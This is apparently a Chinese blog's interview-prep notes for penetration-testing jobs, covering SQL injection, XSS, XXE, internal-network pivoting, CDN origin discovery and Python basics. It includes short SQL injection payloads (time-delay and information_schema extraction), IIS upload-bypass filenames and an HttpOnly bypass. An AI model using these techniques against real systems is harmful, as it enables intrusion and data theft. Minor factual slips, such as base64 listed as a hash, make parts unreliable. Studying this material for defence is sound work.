<h3 id="英语介绍一下自己"><a href="#英语介绍一下自己" class="headerlink" title="英语介绍一下自己"></a>英语介绍一下自己</h3><h3 id="职业路径"><a href="#职业路径" class="headerlink" title="职业路径"></a>职业路径</h3><h3 id="大学做过什么相关的事情"><a href="#大学做过什么相关的事情" class="headerlink" title="大学做过什么相关的事情"></a>大学做过什么相关的事情</h3><h3 id="在工作会做什么来不断提高自己的能力"><a href="#在工作会做什么来不断提高自己的能力" class="headerlink" title="在工作会做什么来不断提高自己的能力"></a>在工作会做什么来不断提高自己的能力</h3><h2 id="卓望"><a href="#卓望" class="headerlink" title="卓望"></a>卓望</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><h3 id="描述渗透项目，做了什么"><a href="#描述渗透项目，做了什么" class="headerlink" title="描述渗透项目，做了什么"></a>描述渗透项目，做了什么</h3><h3 id="xss漏洞类型、详情、修复方案"><a href="#xss漏洞类型、详情、修复方案" class="headerlink" title="xss漏洞类型、详情、修复方案"></a>xss漏洞类型、详情、修复方案</h3><h3 id="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"><a href="#SQL注入原理、类型，waf绕过，写shell，提权，修复方案" class="headerlink" title="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"></a>SQL注入原理、类型，waf绕过，写shell，提权，修复方案</h3><h3 id="终端的渗透经验"><a href="#终端的渗透经验" class="headerlink" title="终端的渗透经验"></a>终端的渗透经验</h3><h3 id="了解什么比较新的漏洞"><a href="#了解什么比较新的漏洞" class="headerlink" title="了解什么比较新的漏洞"></a>了解什么比较新的漏洞</h3><h3 id="企业内部安全"><a href="#企业内部安全" class="headerlink" title="企业内部安全"></a>企业内部安全</h3><p>信息安全管理的本质就是输入和输出。一般防范的风险为物理威胁和网络威胁。<br>防范风险可以从制度和流程（人员入离职流程、权限申请流程）、人员配备和知识积累、风险防范（物理威胁：门禁、监控、禁止USB设备接入、封闭PC、定时巡检；网络威胁：部署行为管控设备、可靠的网络结构、IP和MAC地址绑定，将网络行为分组、限制不必要的软件和通信协议、定期审核日志）</p>
<h2 id="安巽"><a href="#安巽" class="headerlink" title="安巽"></a>安巽</h2><h3 id="算法？了解过什么排序？"><a href="#算法？了解过什么排序？" class="headerlink" title="算法？了解过什么排序？"></a>算法？了解过什么排序？</h3><p>快速排序 冒泡排序</p>
<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="页面存在很多js的时候，用什么"><a href="#页面存在很多js的时候，用什么" class="headerlink" title="页面存在很多js的时候，用什么"></a>页面存在很多js的时候，用什么</h4><p>phnatomJS selenium execjs</p>
<h4 id="爬虫的待爬取URL量级比较大的时候，如何对其去重"><a href="#爬虫的待爬取URL量级比较大的时候，如何对其去重" class="headerlink" title="爬虫的待爬取URL量级比较大的时候，如何对其去重"></a>爬虫的待爬取URL量级比较大的时候，如何对其去重</h4><ul>
<li>在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取</li>
<li>在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率</li>
<li>使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大</li>
<li>使用Map或是一个定长数组记录某一个URL是否被访问过</li>
<li>布隆过滤器(bloom filter)，bitmap</li>
</ul>
<h4 id="多线程-异步-协程-多路复用-用哪一个最快-为什么"><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么" class="headerlink" title="多线程 异步 协程 多路复用 用哪一个最快 为什么"></a>多线程 异步 协程 多路复用 用哪一个最快 为什么</h4><blockquote>
<p><a href="https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3" target="_blank" rel="noopener">https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3</a></p>
</blockquote>
<p>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p>
<p>异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。</p>
<p>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈</p>
<p>IO多路复用 异步阻塞IO 线程轮询IO</p>
<h3 id="浏览器的常用编码"><a href="#浏览器的常用编码" class="headerlink" title="浏览器的常用编码"></a>浏览器的常用编码</h3><p>一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 <a href="http://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-content-type.html</a> </p>
<h3 id="web常用的加密算法有什么"><a href="#web常用的加密算法有什么" class="headerlink" title="web常用的加密算法有什么"></a>web常用的加密算法有什么</h3><p>非对称加密  RSA、ElGamal、Rabin<br>对称加密 DES、3DES、AES<br>散列算法 MD5 SHA base64</p>
<h3 id="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？" class="headerlink" title="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"></a>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</h3><p>拿下机器后<br>内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts  hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁  这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的   拿到的各种记录 会暴露出部分内网通讯的ip</p>
<p>内网内弱口令占大多数 FTP MSSQL 远程桌面链接</p>
<h3 id="mysql中like查询会会非常缓慢，如何进行优化"><a href="#mysql中like查询会会非常缓慢，如何进行优化" class="headerlink" title="mysql中like查询会会非常缓慢，如何进行优化"></a>mysql中like查询会会非常缓慢，如何进行优化</h3><p>分词索引</p>
<h3 id="做了cdn的网站如何获取真实IP"><a href="#做了cdn的网站如何获取真实IP" class="headerlink" title="做了cdn的网站如何获取真实IP"></a>做了cdn的网站如何获取真实IP</h3><ol>
<li>多地ping看是否有cdn</li>
<li>邮件订阅或者rss订阅</li>
<li>二级域名可能不会做cdn</li>
<li>nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns</li>
<li>查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 <a href="https://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=www.xxx.com</a></li>
<li>phpinfo上显示的信息</li>
</ol>
<h3 id="渗透的时候如何隐藏自己的身份"><a href="#渗透的时候如何隐藏自己的身份" class="headerlink" title="渗透的时候如何隐藏自己的身份"></a>渗透的时候如何隐藏自己的身份</h3><h3 id="主机疑似遭到入侵，要看哪里的日志"><a href="#主机疑似遭到入侵，要看哪里的日志" class="headerlink" title="主机疑似遭到入侵，要看哪里的日志"></a>主机疑似遭到入侵，要看哪里的日志</h3><h3 id="SQL注入漏洞怎么修复"><a href="#SQL注入漏洞怎么修复" class="headerlink" title="SQL注入漏洞怎么修复"></a>SQL注入漏洞怎么修复</h3><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><h3 id="安全研究的方面？做过哪些渗透测试的工作？"><a href="#安全研究的方面？做过哪些渗透测试的工作？" class="headerlink" title="安全研究的方面？做过哪些渗透测试的工作？"></a>安全研究的方面？做过哪些渗透测试的工作？</h3><h3 id="只给你一个网址，如何进行渗透测试"><a href="#只给你一个网址，如何进行渗透测试" class="headerlink" title="只给你一个网址，如何进行渗透测试"></a>只给你一个网址，如何进行渗透测试</h3><h3 id="SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"><a href="#SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？" class="headerlink" title="SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"></a>SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？</h3><h3 id="sleep被禁用后还能怎么进行sql注入"><a href="#sleep被禁用后还能怎么进行sql注入" class="headerlink" title="sleep被禁用后还能怎么进行sql注入"></a>sleep被禁用后还能怎么进行sql注入</h3><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。<br>mysql：<code>AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);</code></p>
<h3 id="XSS可以控制属性怎么利用"><a href="#XSS可以控制属性怎么利用" class="headerlink" title="XSS可以控制属性怎么利用"></a>XSS可以控制属性怎么利用</h3><h3 id="CSRF怎么防护？"><a href="#CSRF怎么防护？" class="headerlink" title="CSRF怎么防护？"></a>CSRF怎么防护？</h3><p>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p>
<h3 id="请求头中哪些是有危害的？"><a href="#请求头中哪些是有危害的？" class="headerlink" title="请求头中哪些是有危害的？"></a>请求头中哪些是有危害的？</h3><p>Cookie</p>
<h3 id="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过" class="headerlink" title="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"></a>XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</h3><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的</p>
<p>防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml</p>
<p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p>
<p>javax.xml.stream.XMLStreamReader;</p>
<p>javax.xml.parsers.DocumentBuilderFactory;</p>
<h3 id="JAVA中间件的漏洞，举几个例子？"><a href="#JAVA中间件的漏洞，举几个例子？" class="headerlink" title="JAVA中间件的漏洞，举几个例子？"></a>JAVA中间件的漏洞，举几个例子？</h3><p>常见的是反序列化漏洞</p>
<h3 id="IIS常见的漏洞"><a href="#IIS常见的漏洞" class="headerlink" title="IIS常见的漏洞"></a>IIS常见的漏洞</h3><p>常见的为解析漏洞，6.0有<br>/test.asp/test.jpg<br>  test.asp;.jpg<br>  7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx<br>  原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。</p>
<h3 id="python有哪些框架，其中出现过哪些漏洞"><a href="#python有哪些框架，其中出现过哪些漏洞" class="headerlink" title="python有哪些框架，其中出现过哪些漏洞"></a>python有哪些框架，其中出现过哪些漏洞</h3><p>flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值<br>如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。<br>还可以利用模板中html标签属性字段绕过xss过滤。</p>
<p>Django出现过目录遍历漏洞</p>
<h3 id="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？" class="headerlink" title="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"></a>业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</h3><h3 id="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？" class="headerlink" title="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"></a>PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</h3><h3 id="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie" class="headerlink" title="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"></a>HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h3><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p>
<h2 id="盛邦"><a href="#盛邦" class="headerlink" title="盛邦"></a>盛邦</h2><h3 id="有没有做过协议分析和抓包分析"><a href="#有没有做过协议分析和抓包分析" class="headerlink" title="有没有做过协议分析和抓包分析"></a>有没有做过协议分析和抓包分析</h3><h2 id="翼果"><a href="#翼果" class="headerlink" title="翼果"></a>翼果</h2><h3 id="mysql查看版本？"><a href="#mysql查看版本？" class="headerlink" title="mysql查看版本？"></a>mysql查看版本？</h3><h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h3 id="编程能力-平台逆向-修改程序入口-rootkit有没有研究过"><a href="#编程能力-平台逆向-修改程序入口-rootkit有没有研究过" class="headerlink" title="编程能力/平台逆向/修改程序入口/rootkit有没有研究过"></a>编程能力/平台逆向/修改程序入口/rootkit有没有研究过</h3>]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>个人准备渗透测试和安全面试的经验之谈（3）</title>
    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%883%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/%E6%8A%80%E6%9C%AF%E9%9D%A2%20%E5%88%86%E4%BA%AB.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/%E6%8A%80%E6%9C%AF%E9%9D%A2%20%E5%88%86%E4%BA%AB.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#技术面试问题">技术面试问题</a><ul>
<li><a href="#ctf">CTF</a><ul>
<li><a href="#说一个印象深刻的ctf的题目">说一个印象深刻的CTF的题目</a><ul>
<li><a href="#sql二次注入">sql二次注入</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#python">Python</a><ul>
<li><a href="#爬虫模块框架反爬虫机制ip-代理池验证码破解ua">爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</a></li>
<li><a href="#并发多线程线程池协程三个程之间的区别">并发(多线程、线程池、协程、三个程之间的区别)</a></li>
<li><a href="#常用的标准库">常用的标准库</a></li>
<li><a href="#django和flask区别和使用">DJANGO和FLASK区别和使用</a></li>
<li><a href="#orm">ORM</a></li>
<li><a href="#python安全工具编写源码阅读">python安全工具编写/源码阅读</a></li>
<li><a href="#证明能力">证明能力</a></li>
</ul>
</li>
<li><a href="#密码学">密码学</a><ul>
<li><a href="#rsa">RSA</a></li>
<li><a href="#des">DES</a></li>
<li><a href="#aes">AES</a></li>
<li><a href="#国内sm系列">国内SM系列</a></li>
</ul>
</li>
<li><a href="#风险评估">风险评估</a><ul>
<li><a href="#流程">流程</a></li>
<li><a href="#三要素">三要素</a></li>
</ul>
</li>
<li><a href="#代码审计">代码审计</a><ul>
<li><a href="#fority-sca审计java代码">Fority SCA审计JAVA代码</a></li>
<li><a href="#seay审计php代码">Seay审计PHP代码</a></li>
<li><a href="#源码阅读">源码阅读</a></li>
</ul>
</li>
<li><a href="#应急响应具体流程">应急响应具体流程</a><ul>
<li><a href="#模型">模型</a></li>
<li><a href="#实例">实例</a><ul>
<li><a href="#ddos">DDOS</a><ul>
<li><a href="#ddos是什么">DDOS是什么</a></li>
</ul>
</li>
<li><a href="#实例-1">实例</a></li>
<li><a href="#主机被入侵">主机被入侵</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#渗透测试流程相关">渗透测试流程相关</a><ul>
<li><a href="#渗透测试流程">渗透测试流程</a></li>
<li><a href="#渗透测试项目">渗透测试项目</a></li>
<li><a href="#渗透测试具体实施">渗透测试具体实施</a></li>
<li><a href="#17年owasp-top10">17年OWASP TOP10</a></li>
<li><a href="#常见的web安全漏洞">常见的Web安全漏洞</a></li>
<li><a href="#挖过什么逻辑漏洞">挖过什么逻辑漏洞</a><ul>
<li><a href="#订单任意金额修改">订单任意金额修改</a></li>
<li><a href="#验证码回传">验证码回传</a></li>
<li><a href="#未进行登陆凭证验证">未进行登陆凭证验证</a></li>
<li><a href="#接口无限制枚举">接口无限制枚举</a></li>
<li><a href="#cookie设置存在缺陷">cookie设置存在缺陷</a></li>
</ul>
</li>
<li><a href="#找回密码功能缺陷">找回密码功能缺陷</a></li>
<li><a href="#你常用的渗透工具有哪些最常用的是哪个">你常用的渗透工具有哪些，最常用的是哪个？</a><ul>
<li><a href="#扫描nessusawvsnikto">扫描:Nessus,AWVS,Nikto</a></li>
<li><a href="#sqlmap">SQLmap</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#metasploit">Metasploit</a></li>
<li><a href="#hydra">Hydra</a></li>
<li><a href="#kali信息收集工具">kali信息收集工具</a></li>
<li><a href="#流量分析wireshark">流量分析WireShark</a></li>
</ul>
</li>
<li><a href="#描述一个你深入研究过的cve或pocms17-010最新的cve">描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</a></li>
</ul>
</li>
<li><a href="#数据库注入">数据库注入</a><ul>
<li><a href="#mysql面试题">MySQL面试题</a><ul>
<li><a href="#mysql存储引擎">MySQL存储引擎？</a></li>
<li><a href="#什么是事务">什么是事务？</a></li>
<li><a href="#读锁和写锁">读锁和写锁</a></li>
<li><a href="#mysql的索引">MySQL的索引</a></li>
<li><a href="#order-by在注入的运用">ORDER BY在注入的运用</a></li>
<li><a href="#gpc是什么gpc之后怎么绕过">GPC是什么？GPC之后怎么绕过？</a></li>
<li><a href="#mysql一个和两个什么区别">Mysql一个@和两个@什么区别</a></li>
<li><a href="#注入绕过常用的函数">注入/绕过常用的函数</a></li>
<li><a href="#mysql存储过程">MySQL存储过程</a></li>
<li><a href="#各种写shell的问题">各种写shell的问题</a></li>
</ul>
</li>
<li><a href="#注入类型">注入类型</a></li>
<li><a href="#sql注入的原理">SQL注入的原理</a></li>
<li><a href="#过waf">过waf</a></li>
<li><a href="#如何进行sql注入的防御">如何进行SQL注入的防御</a></li>
<li><a href="#mysql的网站注入50以上和50以下有什么区别">mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li>
<li><a href="#sql和nosql的区别">SQL和NoSQL的区别</a><ul>
<li><a href="#sql优点">SQL优点</a></li>
<li><a href="#sql缺点">SQL缺点</a></li>
<li><a href="#nosql优点">NoSQL优点</a></li>
<li><a href="#比较">比较</a></li>
<li><a href="#mongodb注入方式">MongoDB注入方式</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#xss-csrf-xxe">XSS CSRF XXE</a><ul>
<li><a href="#csrf-和-xss-和-xxe-有什么区别以及修复方式">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</a></li>
<li><a href="#csrfssrf和重放攻击有什么区别">CSRF、SSRF和重放攻击有什么区别？</a></li>
<li><a href="#啥是同源策略跨域有几种方式">啥是同源策略，跨域有几种方式？</a></li>
<li><a href="#如何规避同源策略">如何规避同源策略？</a><ul>
<li><a href="#jsonp">JSONP</a><ul>
<li><a href="#jsonp的劫持">JSONP的劫持</a></li>
</ul>
</li>
<li><a href="#websocket">WebSocket</a></li>
<li><a href="#cors重点">CORS(重点)</a><ul>
<li><a href="#与jsonp的比较">与JSONP的比较</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dom-xss与反射xss有啥不同，给你10s，如何快速判断一个xss是否是dom-xss？">DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</a></li>
<li><a href="#csp策略">CSP策略</a></li>
<li><a href="#ssrf漏洞原理是什么利用时有哪些伪协议">SSRF漏洞原理是什么？利用时有哪些伪协议？</a><ul>
<li><a href="#漏洞原理">漏洞原理</a></li>
<li><a href="#ssrf用处">ssrf用处</a></li>
<li><a href="#漏洞处">漏洞处</a></li>
<li><a href="#绕过姿势">绕过姿势</a></li>
<li><a href="#利用协议">利用协议</a></li>
<li><a href="#漏洞修复">漏洞修复</a></li>
</ul>
</li>
<li><a href="#在浏览器端referer可以篡改吗">在浏览器端，Referer可以篡改吗？</a></li>
<li><a href="#xss盲打到内网服务器的利用">xss盲打到内网服务器的利用</a></li>
<li><a href="#xss代码层防御">xss代码层防御</a></li>
</ul>
</li>
<li><a href="#文件上传下载遍历漏洞">文件上传下载遍历漏洞</a><ul>
<li><a href="#原理">原理</a></li>
<li><a href="#修复方案">修复方案</a></li>
</ul>
</li>
<li><a href="#文件包含漏洞">文件包含漏洞</a><ul>
<li><a href="#类型">类型</a></li>
<li><a href="#php文件包含函数">PHP文件包含函数</a></li>
<li><a href="#利用">利用</a></li>
<li><a href="#修复方案-1">修复方案</a></li>
</ul>
</li>
<li><a href="#web框架漏洞弱点">web框架漏洞弱点</a><ul>
<li><a href="#服务端注入之flask框架中服务端模板注入问题">服务端注入之Flask框架中服务端模板注入问题</a></li>
</ul>
</li>
<li><a href="#http协议">HTTP协议</a><ul>
<li><a href="#tcp三次握手四次挥手">TCP三次握手四次挥手</a><ul>
<li><a href="#三次握手">三次握手</a></li>
<li><a href="#四次挥手">四次挥手</a></li>
</ul>
</li>
<li><a href="#四层模型">四层模型</a></li>
<li><a href="#当你输入一个网址点击访问会发生什么">当你输入一个网址，点击访问，会发生什么？</a><ul>
<li><a href="#查找dns记录">查找DNS记录</a></li>
<li><a href="#建立连接">建立连接</a></li>
</ul>
</li>
<li><a href="#常见的状态码">常见的状态码</a></li>
<li><a href="#osi七层">OSI七层</a><ul>
<li><a href="#osi四层">OSI四层</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#路由协议">路由协议</a><ul>
<li><a href="#你搭建过的最复杂的网络设备是什么">你搭建过的最复杂的网络设备是什么</a></li>
<li><a href="#使用过什么硬件设备">使用过什么硬件设备</a></li>
</ul>
</li>
<li><a href="#linux运维">Linux运维</a><ul>
<li><a href="#启动过程">启动过程</a></li>
<li><a href="#linux基线规范">Linux基线规范</a><ul>
<li><a href="#账号管理和授权">账号管理和授权</a></li>
<li><a href="#服务">服务</a></li>
<li><a href="#文件系统">文件系统</a></li>
<li><a href="#日志">日志</a></li>
<li><a href="#ip协议安全要求">IP协议安全要求</a></li>
</ul>
</li>
<li><a href="#中间件基线规范apache">中间件基线规范（APACHE）</a><ul>
<li><a href="#配置">配置</a></li>
<li><a href="#禁止">禁止</a></li>
<li><a href="#隐藏">隐藏</a></li>
<li><a href="#删除">删除</a></li>
</ul>
</li>
<li><a href="#webshell检测思路">webshell检测思路</a><ul>
<li><a href="#静态检测">静态检测</a></li>
<li><a href="#动态检测">动态检测</a></li>
<li><a href="#日志检测">日志检测</a></li>
<li><a href="#语法检测">语法检测</a></li>
<li><a href="#统计学检测">统计学检测</a></li>
<li><a href="#防范webshell">防范webshell</a></li>
</ul>
</li>
<li><a href="#计划任务">计划任务</a></li>
<li><a href="#自动化运维编写过什么脚本">自动化运维编写过什么脚本</a></li>
<li><a href="#yum用的什么源本地自搭挂载">yum用的什么源（本地自搭，挂载）</a></li>
<li><a href="#awk-sed的使用">awk sed的使用</a></li>
<li><a href="#排错思路排错经验">排错思路，排错经验</a></li>
<li><a href="#日志分析elk的使用和分析">日志分析ELK的使用和分析</a><ul>
<li><a href="#事件发生的分析">事件发生的分析</a></li>
</ul>
</li>
<li><a href="#用户权限管理修改">用户权限管理(修改)</a></li>
<li><a href="#防火墙">防火墙</a></li>
<li><a href="#ipsec-vpn">IPsec VPN</a></li>
<li><a href="#安全监控工具">安全监控工具</a></li>
<li><a href="#linux木马查杀">Linux木马查杀</a></li>
<li><a href="#常见的设备有啥">常见的设备有啥</a></li>
</ul>
</li>
<li><a href="#windows运维">Windows运维</a><ul>
<li><a href="#基线规范">基线规范</a></li>
<li><a href="#木马查杀">木马查杀</a></li>
<li><a href="#计划任务-1">计划任务</a></li>
</ul>
</li>
<li><a href="#iso27000和等保重点等保">ISO27000和等保(重点等保)</a><ul>
<li><a href="#说一下iso27000">说一下ISO27000</a></li>
<li><a href="#说一下等级保护制度">说一下等级保护制度</a></li>
<li><a href="#差异">差异</a></li>
<li><a href="#共性">共性</a></li>
</ul>
</li>
<li><a href="#算法">算法</a><ul>
<li><a href="#排序算法快排-二分-冒泡">排序算法：快排 二分 冒泡</a></li>
</ul>
</li>
<li><a href="#ldap注入">LDAP注入</a></li>
</ul>
</li>
</ul>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/25582026" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25582026</a></p>
</blockquote>
<blockquote>
<p>给你一个网站你是如何来<em>渗透测试</em>的? - 杨文的文章 - 知乎 <a href="http://zhuanlan.zhihu.com/p/25605198" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/p/25605198</a></p>
</blockquote>
<h1 id="技术面试问题"><a href="#技术面试问题" class="headerlink" title="技术面试问题"></a>技术面试问题</h1><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="说一个印象深刻的CTF的题目"><a href="#说一个印象深刻的CTF的题目" class="headerlink" title="说一个印象深刻的CTF的题目"></a>说一个印象深刻的CTF的题目</h3><ul>
<li>Padding Oracle-&gt;CBC-&gt;密码学(RSA/AES/DSA/SM)</li>
<li>CRC32</li>
<li>反序列化漏洞</li>
</ul>
<h4 id="sql二次注入"><a href="#sql二次注入" class="headerlink" title="sql二次注入"></a>sql二次注入</h4><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
<p>交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列，</p>
<ol>
<li>暴库 <code>group_concat(schema_name) from information_schema.schemata</code></li>
<li>暴表 <code>group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39;</code></li>
<li>获取数据 <code>concat(flag) from flag</code></li>
</ol>
<p>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="爬虫模块、框架、反爬虫机制（IP-gt-代理池、验证码破解、UA）"><a href="#爬虫模块、框架、反爬虫机制（IP-gt-代理池、验证码破解、UA）" class="headerlink" title="爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）"></a>爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</h3><h3 id="并发-多线程、线程池、协程、三个程之间的区别"><a href="#并发-多线程、线程池、协程、三个程之间的区别" class="headerlink" title="并发(多线程、线程池、协程、三个程之间的区别)"></a>并发(多线程、线程池、协程、三个程之间的区别)</h3><p>进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。</p>
<h3 id="常用的标准库"><a href="#常用的标准库" class="headerlink" title="常用的标准库"></a>常用的标准库</h3><ul>
<li><h2 id="functools"><a href="#functools" class="headerlink" title="functools"></a>functools</h2></li>
<li>itertools 迭代器<ul>
<li>count/cycle/repeat</li>
<li>chain</li>
<li>groupby 把迭代器中相邻的重复元素挑出来放在一起</li>
</ul>
</li>
<li>concurrent.futures<ul>
<li>ThreadPoolExecutor</li>
</ul>
</li>
<li>hashlib<ul>
<li>md5</li>
<li>sha1</li>
<li>sha256</li>
<li>sha512</li>
</ul>
</li>
<li>logging </li>
<li>sys.argv argparse读取命令行参数</li>
<li>pickle 序列化工具</li>
<li>re 正则</li>
<li>collections 多种数据类型<ul>
<li>namedtuple</li>
<li>OrderedDict</li>
<li>Counter</li>
</ul>
</li>
<li>os 系统相关的函数</li>
</ul>
